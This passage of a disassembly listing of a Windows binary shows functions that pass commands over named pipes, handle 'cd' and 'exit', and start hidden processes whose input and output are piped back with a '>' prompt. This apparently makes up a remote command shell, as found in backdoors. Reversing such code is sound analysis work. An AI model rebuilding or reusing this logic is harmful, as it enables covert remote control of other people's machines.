                call    ds:WaitForSingleObject
                cmp     eax, 102h
                jnz     loc_406EC1
                push    3FFh
                lea     eax, [esp+2880h+var_80F]
                push    ebx
                push    eax
                mov     [esp+2888h+var_810], bl
                call    sub_413520
                add     esp, 0Ch
                lea     ecx, [esp+287Ch+var_810]
                push    offset aWaitNamedPipeC ; "\nWait named pipe connect time out"
                push    ecx
                call    sub_40E37C
                add     esp, 8
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     edx, [esp+287Ch+var_810]
                push    edx
                lea     ecx, [esp+2880h+var_2864]
                call    sub_408560
                lea     eax, [esp+287Ch+var_2864]
                mov     [esp+287Ch+var_4], 1
                push    eax

loc_406E9E:                             ; CODE XREF: sub_406C90+2D2↓j
                call    sub_408F30
                lea     ecx, [esp+287Ch+var_2864]
                call    sub_4085D0
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                call    sub_4078F0
                jmp     loc_40700C
; ---------------------------------------------------------------------------

loc_406EC1:                             ; CODE XREF: sub_406C90+1AA↑j
                push    2008h
                lea     ecx, [esp+2880h+Buffer]
                push    ebx
                push    ecx
                mov     [esp+2888h+NumberOfBytesWritten], ebx
                call    sub_413520
                mov     ecx, hObject
                add     esp, 0Ch
                push    ebx             ; lpOverlapped
                lea     edx, [esp+2880h+NumberOfBytesWritten]
                push    edx             ; lpNumberOfBytesWritten
                push    400h            ; nNumberOfBytesToWrite
                lea     eax, [esp+2888h+Buffer]
                push    eax             ; lpBuffer
                push    ecx             ; hFile
                mov     [esp+2890h+Buffer], 13h
                call    ds:WriteFile
                test    eax, eax
                jnz     short loc_406F67
                push    3FFh
                lea     edx, [esp+2880h+var_80F]
                push    ebx
                push    edx
                mov     [esp+2888h+var_810], bl
                call    sub_413520
                add     esp, 0Ch
                call    edi ; GetLastError
                push    eax
                lea     eax, [esp+2880h+var_810]
                push    offset aFailedToWriteN ; "\nFailed to write named pipe with error"...
                push    eax
                call    sub_40E37C
                add     esp, 0Ch
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     ecx, [esp+287Ch+var_810]
                push    ecx
                lea     ecx, [esp+2880h+var_2864]
                call    sub_408560
                lea     edx, [esp+287Ch+var_2864]
                mov     [esp+287Ch+var_4], 2
                push    edx
                jmp     loc_406E9E
; ---------------------------------------------------------------------------

loc_406F67:                             ; CODE XREF: sub_406C90+26F↑j
                push    ebx             ; lpThreadId
                push    ebx             ; dwCreationFlags
                push    ebx             ; int
                push    offset sub_403980 ; int
                push    ebx             ; dwStackSize
                push    ebx             ; lpThreadAttributes
                call    sub_40EA6D
                add     esp, 18h
                mov     dword_42C364, eax
                jmp     loc_40700C
; ---------------------------------------------------------------------------

loc_406F83:                             ; CODE XREF: sub_406C90+18F↑j
                push    3FFh
                lea     eax, [esp+2880h+var_40F]
                push    ebx
                push    eax
                mov     [esp+2888h+var_410], bl
                call    sub_413520
                add     esp, 0Ch
                push    esi
                lea     ecx, [esp+2880h+var_410]
                push    offset aConnectNamedPi ; "\nConnect named pipe error:%d"
                push    ecx
                call    sub_40E37C
                add     esp, 0Ch
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     edx, [esp+287Ch+var_410]
                push    edx
                lea     ecx, [esp+2880h+var_2834]
                call    sub_408560
                lea     eax, [esp+287Ch+var_2834]
                push    eax
                mov     [esp+2880h+var_4], 3
                call    sub_408F30
                cmp     [esp+287Ch+var_281C], 10h
                jb      short loc_406FFB
                mov     ecx, [esp+287Ch+var_2830]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_406FFB:                             ; CODE XREF: sub_406C90+35C↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                mov     hObject, ebx

loc_40700C:                             ; CODE XREF: sub_406C90+179↑j
                                        ; sub_406C90+22C↑j ...
                mov     edx, [esp+287Ch+Overlapped.hEvent]
                push    edx             ; hObject
                call    ebp ; CloseHandle

loc_407013:                             ; CODE XREF: sub_406C90+151↑j
                mov     eax, 1
                mov     ecx, [esp+287Ch+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                mov     ecx, [esp+2868h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 2868h
                retn
sub_406C90      endp


; =============== S U B R O U T I N E =======================================


sub_407040      proc near               ; CODE XREF: sub_4052B0+323↑p

NumberOfBytesWritten= dword ptr -208h
Buffer          = byte ptr -204h
var_203         = byte ptr -203h
var_4           = dword ptr -4

                sub     esp, 208h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+208h+var_4], eax
                push    1FFh
                lea     eax, [esp+20Ch+var_203]
                push    0
                push    eax
                mov     [esp+214h+Buffer], 0
                call    sub_413520
                lea     ecx, [esp+214h+Buffer]
                push    ecx
                mov     edx, offset aCl ; "cl"
                mov     ecx, esi
                call    sub_404E40
                lea     eax, [esp+218h+Buffer]
                add     esp, 10h
                mov     [esp+208h+NumberOfBytesWritten], 0
                lea     edx, [eax+1]
                lea     esp, [esp+0]

loc_407090:                             ; CODE XREF: sub_407040+55↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_407090
                mov     ecx, hWritePipe
                sub     eax, edx
                push    0               ; lpOverlapped
                lea     edx, [esp+20Ch+NumberOfBytesWritten]
                push    edx             ; lpNumberOfBytesWritten
                push    eax             ; nNumberOfBytesToWrite
                lea     eax, [esp+214h+Buffer]
                push    eax             ; lpBuffer
                push    ecx             ; hFile
                call    ds:WriteFile
                push    4
                lea     edx, [esp+20Ch+Buffer]
                push    offset aExit    ; "exit"
                push    edx
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_4070E7
                mov     eax, dword_42C338
                push    eax             ; hEvent
                call    ds:SetEvent
                push    3E8h            ; dwMilliseconds
                call    ds:Sleep
                call    sub_407850

loc_4070E7:                             ; CODE XREF: sub_407040+89↑j
                mov     ecx, [esp+208h+var_4]
                xor     ecx, esp
                mov     eax, 1
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 208h
                retn
sub_407040      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_407110      proc near               ; CODE XREF: sub_4052B0+374↑p

hObject         = dword ptr -0DB8h
ProcessInformation= _PROCESS_INFORMATION ptr -0DB4h
var_DA0         = dword ptr -0DA0h
var_D9C         = dword ptr -0D9Ch
var_D98         = dword ptr -0D98h
hReadPipe       = dword ptr -0D94h
PipeAttributes  = _SECURITY_ATTRIBUTES ptr -0D90h
hWritePipe      = dword ptr -0D84h
StartupInfo     = _STARTUPINFOA ptr -0D80h
var_D34         = byte ptr -0D34h
var_D30         = dword ptr -0D30h
var_D20         = dword ptr -0D20h
var_D1C         = dword ptr -0D1Ch
Buffer          = byte ptr -0D18h
var_D17         = byte ptr -0D17h
PathName        = byte ptr -0C10h
var_C0F         = byte ptr -0C0Fh
var_C0E         = byte ptr -0C0Eh
CommandLine     = byte ptr -810h
var_80F         = byte ptr -80Fh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_407110
                mov     eax, large fs:0
                push    eax
                sub     esp, 0DACh
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+0DB8h+var_10], eax
                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+0DCCh+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    3FFh
                lea     eax, [esp+0DD0h+var_C0F]
                push    ebx
                push    eax
                mov     esi, ecx
                mov     [esp+0DD8h+PathName], bl
                call    sub_413520
                lea     ecx, [esp+0DD8h+PathName]
                add     esp, 0Ch
                push    ecx
                mov     edx, offset aCl ; "cl"
                mov     ecx, esi
                call    sub_404E40
                movsx   edx, [esp+0DD0h+PathName]
                add     esp, 4
                push    edx
                call    sub_40EDBB
                add     esp, 4
                test    eax, eax
                jz      short loc_4071B5
                cmp     [esp+0DCCh+var_C0F], 3Ah
                jnz     short loc_4071B5
                lea     eax, [esp+0DCCh+PathName]
                push    eax             ; lpPathName
                call    ds:SetCurrentDirectoryA
                jmp     loc_407498
; ---------------------------------------------------------------------------

loc_4071B5:                             ; CODE XREF: sub_407110+86↑j
                                        ; sub_407110+90↑j
                push    2
                lea     ecx, [esp+0DD0h+PathName]
                push    offset aCd      ; "cd"
                push    ecx
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     loc_40729E
                lea     eax, [esp+0DCCh+PathName]
                lea     edx, [eax+1]
                mov     edi, edi

loc_4071E0:                             ; CODE XREF: sub_407110+D5↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_4071E0
                sub     eax, edx
                cmp     eax, 2
                jbe     loc_407498
                mov     al, [esp+0DCCh+var_C0E]
                cmp     al, 2Eh
                jz      loc_40728B
                cmp     al, 5Ch
                jz      loc_40728B
                cmp     al, 9
                jz      short loc_407215
                cmp     al, 20h
                jnz     loc_40729E

loc_407215:                             ; CODE XREF: sub_407110+FB↑j
                lea     eax, [esp+0DCCh+PathName]
                mov     esi, 2
                lea     edx, [eax+1]

loc_407224:                             ; CODE XREF: sub_407110+119↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_407224
                sub     eax, edx
                cmp     eax, 2
                jbe     short loc_40725D

loc_407232:                             ; CODE XREF: sub_407110+14B↓j
                mov     al, [esp+esi+0DCCh+PathName]
                cmp     al, 9
                jz      short loc_407241
                cmp     al, 20h
                jnz     short loc_40725D

loc_407241:                             ; CODE XREF: sub_407110+12B↑j
                lea     eax, [esp+0DCCh+PathName]
                inc     esi
                lea     edx, [eax+1]
                lea     esp, [esp+0]

loc_407250:                             ; CODE XREF: sub_407110+145↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_407250
                sub     eax, edx
                cmp     esi, eax
                jb      short loc_407232

loc_40725D:                             ; CODE XREF: sub_407110+120↑j
                                        ; sub_407110+12F↑j
                lea     eax, [esp+0DCCh+PathName]
                lea     edx, [eax+1]

loc_407267:                             ; CODE XREF: sub_407110+15C↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_407267
                sub     eax, edx
                cmp     esi, eax
                jnb     loc_407498
                lea     edx, [esp+esi+0DCCh+PathName]
                push    edx             ; lpPathName
                call    ds:SetCurrentDirectoryA
                jmp     loc_407498
; ---------------------------------------------------------------------------

loc_40728B:                             ; CODE XREF: sub_407110+EB↑j
                                        ; sub_407110+F3↑j
                lea     eax, [esp+0DCCh+var_C0E]
                push    eax             ; lpPathName
                call    ds:SetCurrentDirectoryA
                jmp     loc_407498
; ---------------------------------------------------------------------------

loc_40729E:                             ; CODE XREF: sub_407110+BE↑j
                                        ; sub_407110+FF↑j
                push    44h
                lea     ecx, [esp+0DD0h+StartupInfo]
                push    ebx
                push    ecx
                call    sub_413520
                mov     esi, ds:CreatePipe
                xor     eax, eax
                add     esp, 0Ch
                push    ebx             ; nSize
                mov     [esp+0DD0h+PipeAttributes.nLength], eax
                mov     [esp+0DD0h+PipeAttributes.lpSecurityDescriptor], eax
                mov     [esp+0DD0h+PipeAttributes.bInheritHandle], eax
                lea     edx, [esp+0DD0h+PipeAttributes]
                mov     [esp+0DD0h+ProcessInformation.hProcess], eax
                mov     [esp+0DD0h+ProcessInformation.hThread], eax
                mov     [esp+0DD0h+ProcessInformation.dwProcessId], eax
                mov     [esp+0DD0h+ProcessInformation.dwThreadId], eax
                push    edx             ; lpPipeAttributes
                lea     eax, [esp+0DD4h+hWritePipe]
                push    eax             ; hWritePipe
                lea     ecx, [esp+0DD8h+hReadPipe]
                push    ecx             ; hReadPipe
                mov     [esp+0DDCh+PipeAttributes.nLength], 0Ch
                mov     [esp+0DDCh+PipeAttributes.lpSecurityDescriptor], ebx
                mov     [esp+0DDCh+PipeAttributes.bInheritHandle], 1
                call    esi ; CreatePipe
                push    ebx             ; nSize
                lea     edx, [esp+0DD0h+PipeAttributes]
                push    edx             ; lpPipeAttributes
                lea     eax, [esp+0DD4h+var_D98]
                push    eax             ; hWritePipe
                lea     ecx, [esp+0DD8h+hObject]
                push    ecx             ; hReadPipe
                call    esi ; CreatePipe
                lea     edx, [esp+0DCCh+StartupInfo]
                push    edx             ; lpStartupInfo
                call    ds:GetStartupInfoA
                mov     edx, [esp+0DCCh+hReadPipe]
                xor     eax, eax
                mov     [esp+0DCCh+StartupInfo.wShowWindow], ax
                mov     eax, [esp+0DCCh+var_D98]
                push    7FFh
                mov     [esp+0DD0h+StartupInfo.hStdOutput], eax
                mov     [esp+0DD0h+StartupInfo.hStdError], eax
                lea     eax, [esp+0DD0h+var_80F]
                xor     ecx, ecx
                push    ebx
                push    eax
                mov     [esp+0DD8h+StartupInfo.cb], 44h
                mov     [esp+0DD8h+StartupInfo.lpReserved], ebx
                mov     [esp+0DD8h+StartupInfo.lpTitle], ebx
                mov     [esp+0DD8h+StartupInfo.lpDesktop], ebx
                mov     [esp+0DD8h+StartupInfo.dwYSize], ebx
                mov     [esp+0DD8h+StartupInfo.dwXSize], ebx
                mov     [esp+0DD8h+StartupInfo.dwY], ebx
                mov     [esp+0DD8h+StartupInfo.dwX], ebx
                mov     [esp+0DD8h+StartupInfo.lpReserved2], ebx
                mov     [esp+0DD8h+StartupInfo.cbReserved2], cx
                mov     [esp+0DD8h+StartupInfo.dwFlags], 101h
                mov     [esp+0DD8h+StartupInfo.hStdInput], edx
                mov     [esp+0DD8h+CommandLine], bl
                call    sub_413520
                lea     eax, [esp+0DD8h+CommandLine]
                add     esp, 0Ch
                dec     eax
                mov     edi, edi

loc_4073A0:                             ; CODE XREF: sub_407110+296↓j
                mov     cl, [eax+1]
                inc     eax
                cmp     cl, bl
                jnz     short loc_4073A0
                mov     ecx, ds:dword_422740
                mov     edx, ds:dword_422744
                mov     [eax], ecx
                mov     ecx, ds:dword_422748
                mov     [eax+4], edx
                mov     [eax+8], ecx
                lea     eax, [esp+0DCCh+PathName]
                mov     edx, eax
                jmp     short loc_4073D0
; ---------------------------------------------------------------------------
                align 10h

loc_4073D0:                             ; CODE XREF: sub_407110+2BB↑j
                                        ; sub_407110+2C5↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_4073D0
                lea     edi, [esp+0DCCh+CommandLine]
                sub     eax, edx
                dec     edi

loc_4073E1:                             ; CODE XREF: sub_407110+2D7↓j
                mov     cl, [edi+1]
                inc     edi
                cmp     cl, bl
                jnz     short loc_4073E1
                mov     ecx, eax
                shr     ecx, 2
                mov     esi, edx
                rep movsd
                mov     ecx, eax
                lea     edx, [esp+0DCCh+ProcessInformation]
                push    edx             ; lpProcessInformation
                lea     eax, [esp+0DD0h+StartupInfo]
                push    eax             ; lpStartupInfo
                push    ebx             ; lpCurrentDirectory
                push    ebx             ; lpEnvironment
                push    10h             ; dwCreationFlags
                push    1               ; bInheritHandles
                and     ecx, 3
                push    ebx             ; lpThreadAttributes
                rep movsb
                push    ebx             ; lpProcessAttributes
                lea     ecx, [esp+0DECh+CommandLine]
                push    ecx             ; lpCommandLine
                push    ebx             ; lpApplicationName
                call    ds:CreateProcessA
                test    eax, eax
                jz      short loc_407476
                mov     edx, [esp+0DCCh+ProcessInformation.hThread]
                push    edx             ; hObject
                call    ds:CloseHandle
                mov     ebp, ds:WaitForSingleObject
                xor     esi, esi

loc_407431:                             ; CODE XREF: sub_407110+33E↓j
                mov     eax, [esp+0DCCh+ProcessInformation.hProcess]
                push    0BB8h           ; dwMilliseconds
                push    eax             ; hHandle
                call    ebp ; WaitForSingleObject
                mov     edi, [esp+0DCCh+hObject]
                test    eax, eax
                jz      short loc_407452
                call    sub_4050B0
                inc     esi
                cmp     esi, 0Ah
                jl      short loc_407431
                jmp     short loc_407457
; ---------------------------------------------------------------------------

loc_407452:                             ; CODE XREF: sub_407110+333↑j
                call    sub_4050B0

loc_407457:                             ; CODE XREF: sub_407110+340↑j
                mov     ecx, [esp+0DCCh+ProcessInformation.hProcess]
                push    0BB8h           ; dwMilliseconds
                push    ecx             ; hHandle
                call    ebp ; WaitForSingleObject
                cmp     eax, 102h
                jnz     short loc_407476
                mov     edx, [esp+0DCCh+ProcessInformation.hProcess]
                push    ebx             ; uExitCode
                push    edx             ; hProcess
                call    ds:TerminateProcess

loc_407476:                             ; CODE XREF: sub_407110+30C↑j
                                        ; sub_407110+358↑j
                mov     eax, [esp+0DCCh+hReadPipe]
                mov     esi, ds:CloseHandle
                push    eax             ; hObject
                call    esi ; CloseHandle
                mov     ecx, [esp+0DCCh+hWritePipe]
                push    ecx             ; hObject
                call    esi ; CloseHandle
                mov     edx, [esp+0DCCh+hObject]
                push    edx             ; hObject
                call    esi ; CloseHandle
                mov     eax, [esp+0DCCh+var_D98]
                push    eax             ; hObject
                call    esi ; CloseHandle

loc_407498:                             ; CODE XREF: sub_407110+A0↑j
                                        ; sub_407110+DC↑j ...
                push    103h
                lea     ecx, [esp+0DD0h+var_D17]
                push    ebx
                push    ecx
                mov     [esp+0DD8h+Buffer], bl
                call    sub_413520
                add     esp, 0Ch
                lea     edx, [esp+0DCCh+Buffer]
                push    edx             ; lpBuffer
                push    104h            ; nBufferLength
                call    ds:GetCurrentDirectoryA
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                push    1
                mov     esi, 0Fh
                push    offset asc_422670 ; "\n"
                lea     ecx, [esp+0DD4h+ProcessInformation]
                mov     [esp+0DD4h+var_D9C], esi
                mov     [esp+0DD4h+var_DA0], ebx
                mov     byte ptr [esp+0DD4h+ProcessInformation.hThread], bl
                call    sub_409840
                lea     eax, [esp+0DCCh+ProcessInformation]
                push    eax
                mov     [esp+0DD0h+var_4], ebx
                call    sub_408F30
                or      ebp, 0FFFFFFFFh
                mov     edi, 10h
                mov     [esp+0DCCh+var_4], ebp
                cmp     [esp+0DCCh+var_D9C], edi
                jb      short loc_407527
                mov     ecx, [esp+0DCCh+ProcessInformation.hThread]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_407527:                             ; CODE XREF: sub_407110+408↑j
                lea     eax, [esp+0DCCh+Buffer]
                mov     [esp+0DCCh+var_D9C], esi
                mov     [esp+0DCCh+var_DA0], ebx
                mov     byte ptr [esp+0DCCh+ProcessInformation.hThread], bl
                lea     edx, [eax+1]
                lea     ecx, [ecx+0]

loc_407540:                             ; CODE XREF: sub_407110+435↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_407540
                sub     eax, edx
                push    eax
                lea     edx, [esp+0DD0h+Buffer]
                push    edx
                lea     ecx, [esp+0DD4h+ProcessInformation]
                call    sub_409840
                lea     eax, [esp+0DCCh+ProcessInformation]
                push    eax
                mov     [esp+0DD0h+var_4], 1
                call    sub_408F30
                mov     [esp+0DCCh+var_4], ebp
                cmp     [esp+0DCCh+var_D9C], edi
                jb      short loc_40758A
                mov     ecx, [esp+0DCCh+ProcessInformation.hThread]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_40758A:                             ; CODE XREF: sub_407110+46B↑j
                push    1
                push    offset asc_422674 ; ">"
                lea     ecx, [esp+0DD4h+var_D34]
                mov     [esp+0DD4h+var_D1C], esi
                mov     [esp+0DD4h+var_D20], ebx
                mov     byte ptr [esp+0DD4h+var_D30], bl
                call    sub_409840
                lea     edx, [esp+0DCCh+var_D34]
                push    edx
                mov     [esp+0DD0h+var_4], 2
                call    sub_408F30
                cmp     [esp+0DCCh+var_D1C], edi
                jb      short loc_4075E3
                mov     eax, [esp+0DCCh+var_D30]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_4075E3:                             ; CODE XREF: sub_407110+4C1↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                mov     eax, 1
                mov     ecx, [esp+0DCCh+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                mov     ecx, [esp+0DB8h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 0DB8h
                retn
sub_407110      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_407620      proc near               ; CODE XREF: sub_4052B0+3C5↑p

NumberOfBytesWritten= dword ptr -2638h
var_2634        = byte ptr -2634h
var_2630        = dword ptr -2630h
var_2620        = dword ptr -2620h
var_261C        = dword ptr -261Ch
Buffer          = dword ptr -2618h
var_2610        = byte ptr -2610h
var_610         = byte ptr -610h
var_60F         = byte ptr -60Fh
var_410         = byte ptr -410h
var_40F         = byte ptr -40Fh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_407620
                mov     eax, large fs:0
                push    eax
                mov     eax, 262Ch
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+2638h+var_10], eax
                push    ebx
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+2644h+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    1FFh
                lea     eax, [esp+2648h+var_60F]
                push    ebx
                push    eax
                mov     esi, ecx
                mov     [esp+2650h+var_610], bl
                call    sub_413520
                lea     ecx, [esp+2650h+var_610]
                add     esp, 0Ch
                push    ecx
                mov     edx, offset aCl ; "cl"
                mov     ecx, esi
                call    sub_404E40
                add     esp, 4
                push    2008h
                lea     edx, [esp+2648h+Buffer]
                push    ebx
                push    edx
                mov     [esp+2650h+NumberOfBytesWritten], ebx
                call    sub_413520
                lea     eax, [esp+2650h+var_610]
                add     esp, 0Ch
                mov     [esp+2644h+Buffer], 18h
                lea     edx, [eax+1]
                mov     edi, edi

loc_4076C0:                             ; CODE XREF: sub_407620+A5↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_4076C0
                sub     eax, edx
                push    eax
                lea     eax, [esp+2648h+var_610]
                push    eax
                lea     ecx, [esp+264Ch+var_2610]
                push    ecx
                call    sub_414550
                lea     eax, [esp+2650h+var_2610]
                add     esp, 0Ch
                lea     edx, [eax+1]

loc_4076E6:                             ; CODE XREF: sub_407620+CB↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_4076E6
                mov     ecx, hObject
                sub     eax, edx
                push    ebx             ; lpOverlapped
                lea     edx, [esp+2648h+NumberOfBytesWritten]
                push    edx             ; lpNumberOfBytesWritten
                add     eax, 20h
                push    eax             ; nNumberOfBytesToWrite
                lea     eax, [esp+2650h+Buffer]
                push    eax             ; lpBuffer
                push    ecx             ; hFile
                call    ds:WriteFile
                test    eax, eax
                jnz     loc_4077BC
                push    3FFh
                lea     edx, [esp+2648h+var_40F]
                push    ebx
                push    edx
                mov     [esp+2650h+var_410], bl
                call    sub_413520
                add     esp, 0Ch
                call    ds:GetLastError
                push    eax
                lea     eax, [esp+2648h+var_410]
                push    offset aFailedToWriteN ; "\nFailed to write named pipe with error"...
                push    eax
                call    sub_40E37C
                add     esp, 0Ch
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     eax, [esp+2644h+var_410]
                mov     [esp+2644h+var_261C], 0Fh
                mov     [esp+2644h+var_2620], ebx
                mov     byte ptr [esp+2644h+var_2630], bl
                lea     edx, [eax+1]

loc_407771:                             ; CODE XREF: sub_407620+156↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_407771
                sub     eax, edx
                push    eax
                lea     ecx, [esp+2648h+var_410]
                push    ecx
                lea     ecx, [esp+264Ch+var_2634]
                call    sub_409840
                lea     edx, [esp+2644h+var_2634]
                push    edx
                mov     [esp+2648h+var_4], ebx
                call    sub_408F30
                cmp     [esp+2644h+var_261C], 10h
                jb      short loc_4077B1
                mov     eax, [esp+2644h+var_2630]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_4077B1:                             ; CODE XREF: sub_407620+182↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection

loc_4077BC:                             ; CODE XREF: sub_407620+ED↑j
                push    4
                lea     ecx, [esp+2648h+var_610]
                push    offset aExit    ; "exit"
                push    ecx
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_407825
                mov     edx, dword_42BD94
                push    edx             ; hEvent
                call    ds:SetEvent
                push    3E8h            ; dwMilliseconds
                call    ds:Sleep
                mov     eax, hObject
                mov     esi, ds:CloseHandle
                cmp     eax, ebx
                jz      short loc_407813
                push    eax             ; hNamedPipe
                call    ds:DisconnectNamedPipe
                mov     eax, hObject
                push    eax             ; hObject
                call    esi ; CloseHandle
                mov     hObject, ebx

loc_407813:                             ; CODE XREF: sub_407620+1DC↑j
                mov     eax, dword_42BD94
                cmp     eax, ebx
                jz      short loc_407825
                push    eax             ; hObject
                call    esi ; CloseHandle
                mov     dword_42BD94, ebx

loc_407825:                             ; CODE XREF: sub_407620+1B5↑j
                                        ; sub_407620+1FA↑j
                mov     eax, 1
                mov     ecx, [esp+2644h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                pop     ebx
                mov     ecx, [esp+2638h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 2638h
                retn
sub_407620      endp


; =============== S U B R O U T I N E =======================================


sub_407850      proc near               ; CODE XREF: sub_401E10:loc_4026DB↑p
                                        ; sub_4067C0+95↑p ...
                mov     eax, hProcess
                push    esi
                push    edi
                xor     edi, edi
                cmp     eax, edi
                jz      short loc_40787F
                push    edi             ; dwMilliseconds
                push    eax             ; hHandle
                call    ds:WaitForSingleObject
                cmp     eax, 102h
                jnz     short loc_407879
                mov     eax, hProcess
                push    edi             ; uExitCode
                push    eax             ; hProcess
                call    ds:TerminateProcess

loc_407879:                             ; CODE XREF: sub_407850+1A↑j
                mov     hProcess, edi

loc_40787F:                             ; CODE XREF: sub_407850+B↑j
                mov     eax, hReadPipe
                mov     esi, ds:CloseHandle
                cmp     eax, edi
                jz      short loc_407897
                push    eax             ; hObject
                call    esi ; CloseHandle
                mov     hReadPipe, edi

loc_407897:                             ; CODE XREF: sub_407850+3C↑j
                mov     eax, hWritePipe
                cmp     eax, edi
                jz      short loc_4078A9
                push    eax             ; hObject
                call    esi ; CloseHandle
                mov     hWritePipe, edi

loc_4078A9:                             ; CODE XREF: sub_407850+4E↑j
                mov     eax, hFile
                cmp     eax, edi
                jz      short loc_4078BB
                push    eax             ; hObject
                call    esi ; CloseHandle
                mov     hFile, edi

loc_4078BB:                             ; CODE XREF: sub_407850+60↑j
                mov     eax, dword_42C32C
                cmp     eax, edi
                jz      short loc_4078CD
                push    eax             ; hObject
                call    esi ; CloseHandle
                mov     dword_42C32C, edi

loc_4078CD:                             ; CODE XREF: sub_407850+72↑j
                mov     eax, dword_42C338
                cmp     eax, edi
                jz      short loc_4078DF
                push    eax             ; hObject
                call    esi ; CloseHandle
                mov     dword_42C338, edi

loc_4078DF:                             ; CODE XREF: sub_407850+84↑j
                pop     edi
                pop     esi
                retn
sub_407850      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4078F0      proc near               ; CODE XREF: sub_406C90+227↑p
                mov     eax, hObject
                push    esi
                mov     esi, ds:CloseHandle
                test    eax, eax
                jz      short loc_407919
                push    eax             ; hNamedPipe
                call    ds:DisconnectNamedPipe
                mov     eax, hObject
                push    eax             ; hObject
                call    esi ; CloseHandle
                mov     hObject, 0

loc_407919:                             ; CODE XREF: sub_4078F0+E↑j
                mov     eax, dword_42BD94
                test    eax, eax
                jz      short loc_40792F
                push    eax             ; hObject
                call    esi ; CloseHandle
                mov     dword_42BD94, 0

loc_40792F:                             ; CODE XREF: sub_4078F0+30↑j
                pop     esi
                retn
sub_4078F0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_407940      proc near               ; CODE XREF: sub_401AE0+3F↑p

var_1230        = byte ptr -1230h
var_122C        = dword ptr -122Ch
var_1228        = dword ptr -1228h
var_1224        = dword ptr -1224h
var_120C        = dword ptr -120Ch
var_1208        = dword ptr -1208h
var_1204        = dword ptr -1204h
var_1200        = dword ptr -1200h
var_11FC        = byte ptr -11FCh
var_11F8        = dword ptr -11F8h
var_11E8        = dword ptr -11E8h
var_11E4        = dword ptr -11E4h
var_11DC        = dword ptr -11DCh
var_11CC        = dword ptr -11CCh
var_11C8        = dword ptr -11C8h
var_11C4        = dword ptr -11C4h
var_11C0        = dword ptr -11C0h
var_11BC        = byte ptr -11BCh
var_11B8        = dword ptr -11B8h
var_11A4        = dword ptr -11A4h
var_119C        = dword ptr -119Ch
var_118C        = dword ptr -118Ch
var_1188        = dword ptr -1188h
var_1184        = byte ptr -1184h
var_1178        = byte ptr -1178h
var_116C        = byte ptr -116Ch
var_1168        = dword ptr -1168h
var_1158        = dword ptr -1158h
var_1154        = dword ptr -1154h
var_1150        = byte ptr -1150h
var_114C        = dword ptr -114Ch
var_113C        = dword ptr -113Ch
var_1138        = dword ptr -1138h
var_1134        = byte ptr -1134h
var_1130        = dword ptr -1130h
var_1120        = dword ptr -1120h
var_111C        = dword ptr -111Ch
Filename        = byte ptr -1118h
var_1117        = byte ptr -1117h
var_1010        = byte ptr -1010h
var_100F        = byte ptr -100Fh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_407940
                mov     eax, large fs:0
